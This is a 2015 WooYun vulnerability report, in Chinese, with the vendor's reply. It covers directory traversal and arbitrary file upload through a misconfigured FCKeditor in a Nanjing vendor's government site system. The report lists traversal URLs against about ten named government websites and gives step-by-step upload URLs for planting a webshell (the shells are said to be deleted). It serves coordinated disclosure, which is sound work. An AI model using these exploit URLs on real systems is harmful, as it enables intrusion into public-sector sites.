{"id": 34058, "wybug_id": "wooyun-2015-0107339", "wybug_title": "某政府建站系统通用型漏洞打包", "wybug_corp": "南京先行数字技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-04-17 16:30", "wybug_open_date": "2015-07-20 17:02", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-20：\t细节向公众公开  简要描述： 1#目录遍历2#任意文件上传getshell 详细说明：  百度关键字:\n技术支持:南京先行数字技术有限公司\n问题产生的原因是由于fck编辑器1#目录遍历以南京市公安局经济犯罪侦查支队网站为例地址：http://221.231.143.11/www/njga/gajz/index.htm\nhttp://221.231.143.11/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n可跨目录\n\n提供一些我找到的网站供复现\nhttp://www.njfy.gov.cn:8080//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://www.njjg.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://njfy.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://www.njyhfy.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://www.njygcj.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://www.njmg.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://njlhqsfj.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://www.njjg.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://www.njlsxsfj.gov.cn//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n\nhttp://www.njmj.gov.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../\n等等，结果一目了然   漏洞证明：  2#任意文件上传getshell以南京市公安局经济犯罪侦查支队网站为例地址：http://221.231.143.11/www/njga/gajz/index.htm这里直接利用fck的上传页面\nhttp://221.231.143.11/FCKeditor/editor/filemanager/browser/default/browser.html?Type=&Connector=connectors/jsp/connector\n需要注意，必须在上面链接的最后带上参数serverFilePath=njnews/zlh，才可以上传成功，参数值不能随便输入，必须要利用遍历，找到upload目录下面存在类似jpg文件的文件夹，只有把serverFilePath的值设置到这些文件夹才能正常上传，比如\nupload/szzx/szzx/Image\n这个文件夹下存在文件，即可把serverFilePath的值赋值为\nserverFilePath=szzx/szzx\n\n\n然后通过\nhttp://221.231.143.11/FCKeditor/editor/filemanager/browser/default/browser.html?Type=&Connector=connectors/jsp/connector&serverFilePath=szzx/szzx\n即可直接上传\n\n换个存在图片的目录\nhttp://221.231.143.11/FCKeditor/editor/filemanager/browser/default/browser.html?Type=&Connector=connectors/jsp/connector&serverFilePath=njnews/zlh\n\n\n一句话地址：http://221.231.143.11/upload/njnews/zlh/File/01.jsp（此处shell已删除）\n\n\n\n因为上传的特殊性，我再演示一个站点南京市公安局交通管理局http://www.njjg.gov.cn正常的fck上传链接（当然，此时上传是会失败的）\nhttp://www.njjg.gov.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Type=&Connector=connectors/jsp/connector\n利用遍历找到存在文件的能够上传的文件夹\nupload/njjg/njjg/Image\n\n\n构造\nhttp://www.njjg.gov.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Type=&Connector=connectors/jsp/connector&serverFilePath=njjg/njjg\n\n\n\n\n一句话地址：http://www.njjg.gov.cn/upload/njjg/njjg/File/01.jsp（此处shell已删除）\n\n以上存在遍历的站点都存在上传问题，能不能上传，关键在于serverFilePath的配置，个人观察能够上传的目录，是站点用户的上传目录，比如njjg/njjg，对应的就是\n站点名称/站点用户\n，当然这都是我的yy   修复方案：  正确配置fck   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-04-21 17:00 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给江苏分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}